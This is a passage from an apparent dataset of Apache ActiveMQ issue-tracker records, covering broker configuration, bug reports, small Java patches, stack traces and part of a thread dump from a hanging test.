ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:55563/jmxrmiINFO  TransportServerThreadSupport   - Listening for connections at: tcp://0.0.0.0:55553INFO  TransportConnector             - Connector tcp StartedINFO  BrokerService                  - ActiveMQ JMS Message Broker (messagebroker3, ID:nymb02d-59998-1245957027403-0:0) startedINFO  log                            - Logging to org.slf4j.impl.JCLLoggerAdapter(org.mortbay.log) via org.mortbay.log.Slf4jLogINFO  log                            - jetty-6.1.9INFO  log                            - WebApp@1288520654 at http://0.0.0.0:55573/adminINFO  log                            - Started SelectChannelConnector@0.0.0.0:55573Now you can connect via JMX and concole....brokers are very simply configured...broker3 <broker:broker useJmx="true" persistent="true" brokerName="messagebroker3">        <broker:managementContext>            <broker:managementContext connectorPort="55563" jmxDomainName="messagebroker3"/>        </broker:managementContext>        <broker:persistenceAdapter>            <broker:amqPersistenceAdapter directory="/datafiles/itdept/activemq-journal"/>        </broker:persistenceAdapter>        <broker:transportConnectors>            <broker:transportConnector name="tcp" uri="tcp://0.0.0.0:55553"/>        </broker:transportConnectors>    </broker:broker>broker 4  <broker:broker useJmx="true" persistent="true" brokerName="messagebroker4">        <broker:managementContext>            <broker:managementContext connectorPort="55564" jmxDomainName="messagebroker4"/>        </broker:managementContext>        <broker:persistenceAdapter>            <broker:amqPersistenceAdapter directory="/datafiles/itdept/activemq-journal"/>        </broker:persistenceAdapter>        <broker:transportConnectors>            <broker:transportConnector name="tcp" uri="tcp://0.0.0.0:55554"/>        </broker:transportConnectors>    </broker:broker>
issueID:AMQ-2308
type:Bug
changed files:
texts:org.apache.activemq.broker.ft.TransactedTopicMasterSlaveTest test hang on Solaris
Seeing the TransactedTopicMasterSlaveTest hang when run on Solaris.  After examining jstack output for the hanging test and discussing with Gary Tully, he had the following suggestion:Hi Peter,this looks like an example of http://issues.apache.org/activemq/browse/AMQ-1993 but this time on the client side.It seems like a write that results in the first reconnect attempt does not terminate but it should be aborting as there is no listening or reading thread. I guess there is no back log because the next write is blocked by the transport reconnect mutex. Some combination of low level tcp retries should be able to be configured at the OS level, and I guess the defaults should be less than 1 hour so I would expect this test to eventually complete, however, the OS level timeouts and retries may be contingent on a backlog reaching a minimum and currently there will be only one outstanding write due the the locking around the reconnect logic. This being the case, some code needs to implement the timeout.The solution from http://issues.apache.org/activemq/browse/AMQ-1993 may be a good approach here. It will timeout a write call.However the solution is currently only applicable to server side sockets, it needs to be extended to support a client connection.I think all that is needed is to move the additional configuration code from:org.apache.activemq.transport.TransportFactory.serverConfigure(Transport, WireFormat, HashMap)to compositeConfigure that is called for all transports (both client and server)Indeed, this fixes the problem.  I"ve attached a patch against trunk which resolves the issue.
issueID:AMQ-2310
type:Bug
changed files:RestFilter.java
texts:RestFilter.java has a dependency on Sun JDK classes
activemq/activemq-fileserver/src/main/java/org/apache/activemq/util/RestFilter.java depends on sun.net.www.protocol.http.HttpURLConnection. I think this is a rogue import and should have been java.net.HttpURLConnection### Eclipse Workspace Patch 1.0#P activemqIndex: activemq-fileserver/src/main/java/org/apache/activemq/util/RestFilter.java===================================================================--- activemq-fileserver/src/main/java/org/apache/activemq/util/RestFilter.java  (revision 768326)+++ activemq-fileserver/src/main/java/org/apache/activemq/util/RestFilter.java  (working copy)@@ -38,7 +38,7 @@ import org.mortbay.log.Log; import org.mortbay.util.IO; import org.mortbay.util.URIUtil;-import sun.net.www.protocol.http.HttpURLConnection;+import java.net.HttpURLConnection;  /**  * <p>This means that those of us without Sun JDKs can compile
issueID:AMQ-2311
type:Task
changed files:
texts:Use camel-2.0-M2 instead of SNAPSHOT
There are api changes in camel that will affect activemq, such as the removing the JmsExchange part of CAMEL-1078.  In general depending on a snapshot is not a great idea.Since 2.0-M2 was released recently it is a better bet.  Once we"ll have a new release of camel I can take care of the necessary changes in activemq.
issueID:AMQ-2313
type:Improvement
changed files:
texts:Upgrade ApacheDS dependency to 1.5.5 when it is released - fix issue wiht jaas LDAP tests on AIX/IBM jdk
LDAPLoginModuleTest.testRunning  View test details   (org.apache.activemq.jaas)    java.lang.RuntimeException: Failed to create KeyManagerFactory    at org.apache.directory.server.ldap.handlers.extended.StartTlsHandler.setLdapServer(StartTlsHandler.java:164)    at org.apache.directory.server.ldap.LdapService.startLDAP0(LdapService.java:393)    Please wait... Show stacktrace »    « Hide stacktrace    java.lang.RuntimeException: Failed to create KeyManagerFactory    at org.apache.directory.server.ldap.handlers.extended.StartTlsHandler.setLdapServer(StartTlsHandler.java:164)    at org.apache.directory.server.ldap.LdapService.startLDAP0(LdapService.java:393)    at org.apache.directory.server.ldap.LdapService.start(LdapService.java:321)    at org.apache.directory.server.integ.state.NonExistentState.startup(NonExistentState.java:114)    at org.apache.directory.server.integ.state.NonExistentState.test(NonExistentState.java:202)    at org.apache.directory.server.integ.state.TestServerContext.test(TestServerContext.java:187)    at org.apache.directory.server.integ.SiRunner.invokeTestMethod(SiRunner.java:103)    at org.junit.internal.runners.JUnit4ClassRunner.runMethods(JUnit4ClassRunner.java:51)    at org.junit.internal.runners.JUnit4ClassRunner$1.run(JUnit4ClassRunner.java:44)    at org.junit.internal.runners.ClassRoadie.runUnprotected(ClassRoadie.java:27)    at org.junit.internal.runners.ClassRoadie.runProtected(ClassRoadie.java:37)    at org.junit.internal.runners.JUnit4ClassRunner.run(JUnit4ClassRunner.java:42)    at org.apache.directory.server.integ.SiRunner.run(SiRunner.java:77)    at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:62)    at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:138)    at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:163)    at org.apache.maven.surefire.Surefire.run(Surefire.java:84)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)    at java.lang.reflect.Method.invoke(Method.java:618)    at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:244)    at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:814)    Caused by: java.security.NoSuchAlgorithmException: SunX509 KeyManagerFactory not available    at sun.security.jca.GetInstance.getInstance(GetInstance.java:158)    at javax.net.ssl.KeyManagerFactory.getInstance(KeyManagerFactory.java:20)    at org.apache.directory.server.ldap.handlers.extended.StartTlsHandler.setLdapServer(StartTlsHandler.java:160)    ... 22 morealso see:http://www.nabble.com/Apache-1.5.4-server-fails---with-IBM-jre-td21331293.html
issueID:AMQ-2314
type:Bug
changed files:
texts:tmp_storage is not clean up once a slow subscriber is disconnected.
With a producer sending messages to a topic with a slow subscriber, and messages accumulating under the tmp_storage, if the consumer is disconnected messages pushed to tmp_storage are not cleaned up by the broker.I have a test case for this issue which I"ll clean up and attach here.
issueID:AMQ-2318
type:Improvement
changed files:PolicyEntry.java
texts:disable flow control by default in the out of the box configuration?
so many folks seem to hit flow control and the broker locking up. should we make the out of the box the most likely to work for folks (using disk space rather than locking up)?
issueID:AMQ-2321
type:Bug
changed files:
texts:getServices() method of BrokerService throws a ClassCastException
The getServices() method of org.apache.activemq.broker.BrokerService throws a ClassCastException on runtime.    public Service[] getServices() {        return (Service[]) services.toArray();    }must be replace with :    public Service[] getServices() {        return (Service[]) services.toArray(new Service[0]);    }
issueID:AMQ-2322
type:Bug
changed files:
texts:ClassCastException having relation to recovery of expired messages and vmQueueCursor pendingQueuePolicy
from: http://www.nabble.com/ClassCastException-having-relation-to-expired-messages-tp24287023p24287023.htmlWhile testing ActiveMQ5.2.0, I have a question about expired message.Note that testing messages are Persistent and using a queue, set messageexpiration time to 10 seconds. configurations are same except destinationpolicy(using a vm queue cursor) as below<destinationPolicy>       <policyMap>               <policyEntries>                       <policyEntry queue=">" memoryLimit="5mb">                               <dispatchPolicy>                                       <strictOrderDispatchPolicy />                               </dispatchPolicy>                               <deadLetterStrategy>                                       <individualDeadLetterStrategy queuePrefix="DLQ."/>                               </deadLetterStrategy>                               <pendingQueuePolicy>                                       <vmQueueCursor />                               </pendingQueuePolicy>                       </policyEntry>               </policyEntries>       </policyMap></destinationPolicy>Additionally, it turns out that the activemq broker actually does notproactively purge expired messages from queues. so we seta thread that periodically cleared my queues of expired messages by help ofthis forum"s advisor.We suppose that a server is stopped unexpectedly when expired message leaveson queue without disposed by the threadAfter recovering a server, we will expect that remained messages includingboth normal and expired message are loaded normallyHowever server stopped abnormally and some error occured while startingActiveMQ. Errors are like that2009-07-01 17:13:45,125 [main           ] INFO  BrokerService- For help or more information please see: http://activemq.apache.org/2009-07-01 17:13:45,421 [main           ] INFO  KahaStore- Kaha Store using data directoryD:apacheapache-activemq-5.2.0inaryin..datakr-storedata2009-07-01 17:13:45,796 [main           ] ERROR BrokerService- Failed to start ActiveMQ JMS Message Broker. Reason:java.lang.ClassCastException:org.apache.activemq.command.ActiveMQObjectMessagejava.lang.ClassCastException:org.apache.activemq.command.ActiveMQObjectMessage       at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1114)       at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1106)       at org.apache.activemq.broker.region.Queue$5.recoverMessage(Queue.java:173)       atorg.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessage(RecoveryListenerAdapter.java:45)       atorg.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessageReference(RecoveryListenerAdapter.java:56)       atorg.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverReference(KahaReferenceStore.java:82)       atorg.apache.activemq.store.kahadaptor.KahaReferenceStore.recover(KahaReferenceStore.java:93)       atorg.apache.activemq.store.amq.AMQMessageStore.recover(AMQMessageStore.java:481)       at org.apache.activemq.broker.region.Queue.initialize(Queue.java:167)       atorg.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:83)       atorg.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:434)       atorg.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56)       atorg.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:120)       atorg.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:261)       atorg.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)       atorg.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)       atorg.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:147)       atorg.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:142)       atorg.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:149)       atorg.apache.activemq.broker.region.AbstractRegion.start(AbstractRegion.java:94)       atorg.apache.activemq.broker.region.RegionBroker.start(RegionBroker.java:176)       atorg.apache.activemq.broker.jmx.ManagedRegionBroker.start(ManagedRegionBroker.java:103)       atorg.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:112)       at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:154)       at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:154)       atorg.apache.activemq.broker.MutableBrokerFilter.start(MutableBrokerFilter.java:161)       at org.apache.activemq.broker.BrokerService.start(BrokerService.java:468)       atorg.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:52)       atorg.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1368)       atorg.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1334)       atorg.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)       atorg.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)       at java.security.AccessController.doPrivileged(Native Method)       atorg.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)       atorg.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)       atorg.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:221)       atorg.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)       atorg.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)       atorg.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)       atorg.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)       atorg.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:729)       atorg.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:381)       atorg.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)       atorg.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)       atorg.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)       atorg.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)       atorg.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)       atorg.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)       atorg.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)       atorg.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)       atorg.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)       atorg.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129)       atorg.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)       atorg.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79)       at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)       atsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)       atsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)       at java.lang.reflect.Method.invoke(Method.java:585)       at org.apache.activemq.console.Main.runTaskClass(Main.java:225)       at org.apache.activemq.console.Main.main(Main.java:106)2009-07-01 17:13:45,812 [main           ] INFO  BrokerService- ActiveMQ Message Broker (localhost, null) is shutting down2009-07-01 17:13:45,828 [main           ] INFO  NetworkConnector- Network Connector default-nc Stopped
issueID:AMQ-2323
type:Bug
changed files:
texts:purge in jconsole failed
using queue purge in jconsole will create infinite loop because incorrect Statistics whole loop
issueID:AMQ-2324
type:Improvement
changed files:
texts:Forwarded message cannot be distributed to the original broker
I have a simple cause which can cause dispatch problem:1. setup a network of broker1, broker2, bridged by multicast discovery2. make a producer send 5 msg to queueA to broker23. make a consumer to consume from broker1 queueA ( make it slow, so it only consumer 1 msg) but make sure all 5 msg from broker2 are forwared to broker14. stop the consumer to broke1, restart it to consume from broker2 queueA5. the 4 msgs originally published to broker2 and forwarded to broker1 and has not yet been consumed will stuck on broker1 and will not forwarded to broker2 for the consumer to consume. Here is an solution: it checks forwarded to broker( eg, broker1) to see whether it has any active consumer, it will be able forward the message back to the original broker when there is no active consumer on the forwarded to broker.
issueID:AMQ-2327
type:Bug
changed files:
texts:Consumers left hanging in the large network of brokers
In a network of brokers of a size of 4 (or more) and using conduit subscriptions, some "proxy" consumers can be left hanging due to circular references.
issueID:AMQ-2328
type:Bug
changed files:ManagementContext.java
texts:The ManagementContext should allow the host portion to be configurable
Currently the host portion of the JMX URI in the ManagementContext is hard-coded to "localhost" which presents issues with remote JMX. To fix this, the host should be configurable via a setter.
issueID:AMQ-2330
type:Improvement
changed files:ConnectionViewMBean.java
NetworkConnector.java
DestinationViewMBean.java
TopicSubscriptionViewMBean.java
MBeanInfo.java
BrokerService.java
BrokerViewMBean.java
TransportLoggerFactory.java
ManagementContext.java
QueueViewMBean.java
ManagedRegionBroker.java
ConnectorViewMBean.java
SubscriptionViewMBean.java
ManagedTransportConnection.java
AnnotatedMBean.java
TransportLoggerView.java
texts:Add MBean descriptions
JMX allows for method/field/parameter descriptions, but AMQ registers standard Mbeans.  This makes JMX though jconsole fairly cumbersome, one has to constantly consult the javadoc to understand the attributes and parameters.A simple solution is described here:http://weblogs.java.net/blog/emcmanus/archive/2005/07/adding_informat.htmlUsing that approach, I was able to simply annotations copying the existing javadoc to the *ViewMBean classes and replaced the handful of the mbean registration calls.  Patch available.
issueID:AMQ-2335
type:Bug
changed files:AdvisoryBroker.java
texts:Advisory messages for Connections distribute userNames and passwords
Advisory messages for Connections distribute userNames and passwords
issueID:AMQ-2338
type:New Feature
changed files:
texts:Add indexCacheSize option to KahaDB store to allow configuring the read cache size.
None
issueID:AMQ-2339
type:Improvement
changed files:ForcePersistencyModeBrokerPlugin.java
ForcePersistencyModeBroker.java
texts:Enforcing persistent mode for incoming messages
It would be valuable to have a possibility to enforce the persistence mode for incoming messages from clients.In our case, one client connected and sent persistent messages with  TTL=0 to a queue without having a consuming client. This caused the broker to  pile up the messages until it died due to missing space (disk & mem).
issueID:AMQ-2341
type:Improvement
changed files:
texts:Improve web console message dispay
Current div for message body is too small. Also we can add syntax highlighting, so that xml messages can be more readable. Finally, destination name on this is page is displayed by the tooltip and the value is too small, we should use the higher value for this as well.
issueID:AMQ-2342
type:Task
changed files:
texts:rerun Xbean schem generator to verify manual updates to xsd
xds and wiki and html are currently manually updated as generated schema does not validate. need to run the generator to validate all new annotations are being picked up.
issueID:AMQ-2343
type:Improvement
changed files:Topic.java
Queue.java
texts:Decouple sendFailIfNoSpace from producer flow control
We have to notify the producer when broker run into disk storage limit even when the producer flow control is turned off.
issueID:AMQ-2346
type:Bug
changed files:
texts:in managed environment, 2 connections/session, UserTransaction, transaction management gets confused
In geronimo we"re seeing an intermittent tck problem that seems to relate to a situation where there are:&#8211; a BMT stateless session ejb&#8211; two connections (I think these get shared to the same ManagedConnection)&#8211; two sessions&#8211; tx control through UT&#8211; send a message in one tx&#8211; receive message in a tx that is rolled back&#8211; receive message in a tx that is committedIn a public test case I"m seeing that the session proxies get confused about whether there is an active transaction.  This doesn"t happen all the time but with a few repititions it happens consistently.See GERONIMO-4784
issueID:AMQ-2348
type:Task
changed files:
texts:Use camel-2.0-M3 instead of camel-2.0-M2
Attached is a patch that must be used if camel-2.0-M3 is used.
issueID:AMQ-2349
type:Bug
changed files:
texts:Temporary destinations created with PooledConnectionFactory never get deleted
Temporary destinations that created are bound to the underlying connection. If the connection is destroyed, then the temp destinations that bound to the connection will be destroyed.In the case that a PooledConnectionFactory is used, the underlying connection won"t be destroyed even though PooledConnection.close() is called. Instead it is returned back to the pool. Thus, the temp desinations that created would never be destroyed and all of them would be accumulated until the connection is destroyed.We should delete the temp destinations every time when the PooledConnection.close() is called to avoid accumulation of the temporary destinations.
issueID:AMQ-2350
type:Bug
changed files:IntrospectionSupport.java
texts:java.lang.ArrayIndexOutOfBoundsException in org.apache.activemq.util.IntrospectionSupport.<clinit>(IntrospectionSupport.java:52)
The reading and setting of the PropertyEditorManager needs to be synchronized to protect against concurrent modification     [java] java.lang.ExceptionInInitializerError     [java] at org.apache.activemq.ActiveMQConnectionFactory.setBrokerURL(ActiveMQConnectionFactory.java:362)     [java] at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:132)     [java] at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:128)     [java] at org.apache.activemq.ActiveMQConnectionFactory.<init>(ActiveMQConnectionFactory.java:124)     [java] at org.apache.activemq.jndi.ActiveMQInitialContextFactory.createConnectionFactory(ActiveMQInitialContextFactory.java:201)     [java] at org.apache.activemq.jndi.ActiveMQInitialContextFactory.createConnectionFactory(ActiveMQInitialContextFactory.java:140)     [java] at org.apache.activemq.jndi.ActiveMQInitialContextFactory.getInitialContext(ActiveMQInitialContextFactory.java:65)     [java] at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:667)     [java] at javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:288)     [java] at javax.naming.InitialContext.init(InitialContext.java:223)     [java] at javax.naming.InitialContext.<init>(InitialContext.java:197)     [java] at org.spec.perfharness.jms.providers.JNDI.getInitialContext(JNDI.java:295)     [java] at org.spec.perfharness.jms.providers.JNDI.lookupConnectionFactoryFromJNDI(JNDI.java:310)     [java] at org.spec.perfharness.jms.providers.JNDI.lookupConnectionFactory(JNDI.java:218)     [java] at org.spec.jms.agents.SPECWorkerThread.<init>(SPECWorkerThread.java:217)     [java] at org.spec.jms.eventhandler.hq.HQ_InvoiceEH.<init>(HQ_InvoiceEH.java:42)     [java] at org.spec.jms.agents.hq.HQControlThread.createEventHandlers(HQControlThread.java:71)     [java] at org.spec.jms.agents.SPECControlThread.run(SPECControlThread.java:305)     [java] Caused by: java.lang.ArrayIndexOutOfBoundsException     [java] at java.lang.System.arraycopy(Native Method)     [java] at org.apache.activemq.util.IntrospectionSupport.<clinit>(IntrospectionSupport.java:52)     [java] ... 18 more
issueID:AMQ-2351
type:Bug
changed files:InactivityMonitor.java
TcpTransportFactory.java
texts:hung connection - blocked on InactivityMonitor flush and socket write AMQ2012Test
Thread dumps of activemq trunk :: Nightly Solaris #329Loading...Process tree:Click on an item in the tree to view thread dump.PID: 6726 /opt/tools/pfm/jdk/bin/javaPID: 7579 /bin/shPID: 7580 /opt/tools/pfm/jdk/jre/bin/javaProcess ID (PID): 6726Process command line/opt/tools/pfm/jdk/bin/java -XX:MaxPermSize=192m -Xmx768M -DmavenOneRepository=Thread t@988: (state = IN_NATIVE) - java.io.FileInputStream.readBytes(byte[], int, int) @bci=0 (Compiled frame; information may be imprecise) - java.io.FileInputStream.read(byte[], int, int) @bci=4, line=194 (Compiled frame) - sun.nio.cs.StreamDecoder$CharsetSD.readBytes() @bci=135, line=411 (Compiled frame) - sun.nio.cs.StreamDecoder$CharsetSD.implRead(char[], int, int) @bci=112, line=453 (Compiled frame) - sun.nio.cs.StreamDecoder.read(char[], int, int) @bci=180, line=183 (Compiled frame) - java.io.InputStreamReader.read(char[], int, int) @bci=7, line=167 (Interpreted frame) - java.io.BufferedReader.fill() @bci=145, line=136 (Interpreted frame) - java.io.BufferedReader.readLine(boolean) @bci=44, line=299 (Compiled frame) - java.io.BufferedReader.readLine() @bci=2, line=362 (Compiled frame)Thread t@987: (state = IN_NATIVE) - java.io.FileInputStream.readBytes(byte[], int, int) @bci=0 (Compiled frame; information may be imprecise) - java.io.FileInputStream.read(byte[], int, int) @bci=4, line=194 (Compiled frame) - java.io.BufferedInputStream.read1(byte[], int, int) @bci=39, line=254 (Compiled frame) - java.io.BufferedInputStream.read(byte[], int, int) @bci=49, line=313 (Compiled frame) - sun.nio.cs.StreamDecoder$CharsetSD.readBytes() @bci=135, line=411 (Compiled frame) - sun.nio.cs.StreamDecoder$CharsetSD.implRead(char[], int, int) @bci=112, line=453 (Compiled frame) - sun.nio.cs.StreamDecoder.read(char[], int, int) @bci=180, line=183 (Compiled frame) - java.io.InputStreamReader.read(char[], int, int) @bci=7, line=167 (Interpreted frame) - java.io.BufferedReader.fill() @bci=145, line=136 (Interpreted frame) - java.io.BufferedReader.readLine(boolean) @bci=44, line=299 (Compiled frame) - java.io.BufferedReader.readLine() @bci=2, line=362 (Compiled frame)Thread t@986: (state = IN_NATIVE) - java.lang.UNIXProcess.waitForProcessExit(int) @bci=0 (Interpreted frame) - java.lang.UNIXProcess.waitForProcessExit(int) @bci=0 (Interpreted frame) - java.lang.UNIXProcess.access$900(java.lang.UNIXProcess, int) @bci=2, line=17 (Interpreted frame) - java.lang.UNIXProcess$2$1.run() @bci=17, line=86 (Interpreted frame)Thread t@64: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - java.util.TimerThread.mainLoop() @bci=28, line=483 (Interpreted frame) - java.util.TimerThread.run() @bci=1, line=462 (Interpreted frame)Thread t@27: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.LinkedBlockingQueue.take() @bci=20, line=316 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask() @bci=156, line=994 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.runWorker(hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker) @bci=17, line=1054 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=5, line=575 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@26: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.LinkedBlockingQueue.take() @bci=20, line=316 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask() @bci=156, line=994 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.runWorker(hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker) @bci=17, line=1054 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=5, line=575 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@25: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.LinkedBlockingQueue.take() @bci=20, line=316 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask() @bci=156, line=994 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.runWorker(hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker) @bci=17, line=1054 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=5, line=575 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@24: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.LinkedBlockingQueue.take() @bci=20, line=316 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask() @bci=156, line=994 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.runWorker(hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker) @bci=17, line=1054 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=5, line=575 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@23: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.LinkedBlockingQueue.take() @bci=20, line=316 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.getTask() @bci=156, line=994 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor.runWorker(hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker) @bci=17, line=1054 (Interpreted frame) - hidden.edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=5, line=575 (Interpreted frame) - java.lang.Thread.run() @bci=11, line=595 (Interpreted frame)Thread t@15: (state = BLOCKED)Thread t@14: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.ref.ReferenceQueue.remove(long) @bci=44, line=116 (Interpreted frame) - java.lang.ref.ReferenceQueue.remove() @bci=2, line=132 (Interpreted frame) - java.lang.ref.Finalizer$FinalizerThread.run() @bci=3, line=159 (Interpreted frame)Thread t@13: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - java.lang.ref.Reference$ReferenceHandler.run() @bci=46, line=116 (Interpreted frame)Thread t@1: (state = BLOCKED) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait(long) @bci=0 (Interpreted frame) - java.lang.Object.wait() @bci=2, line=474 (Interpreted frame) - java.lang.UNIXProcess.waitFor() @bci=8, line=115 (Interpreted frame) - org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.CommandLineUtils.executeCommandLine(org.apache.maven.surefire.booter.shade.org.codehaus.plexus.util.cli.Commandline, java.io.InputStream, 